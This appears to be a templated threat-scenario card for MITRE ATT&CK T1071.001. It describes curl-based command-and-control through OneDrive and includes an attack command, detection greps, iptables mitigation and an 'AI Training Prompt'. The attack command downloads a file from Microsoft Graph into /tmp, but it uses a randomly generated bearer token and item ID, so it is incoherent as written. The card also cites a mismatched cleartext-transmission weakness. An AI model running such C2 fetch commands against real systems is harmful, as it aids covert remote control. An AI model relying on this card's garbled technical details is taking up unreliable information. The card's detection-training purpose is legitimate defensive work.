---
type: campaign
scenario_id: 383
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with OneDrive for C2.

## Threat Description
Using curl to communicate with OneDrive for C2.

## Attack Command
```
curl -H "Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://graph.microsoft.com/v1.0/me/drive/items/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/content -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl OneDrive: `ps aux | grep curl | grep graph.microsoft.com`; Network traffic: `tcpdump -i any host graph.microsoft.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block Microsoft Graph: `iptables -A OUTPUT -d graph.microsoft.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via OneDrive by analyzing HTTP headers, Microsoft Graph API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
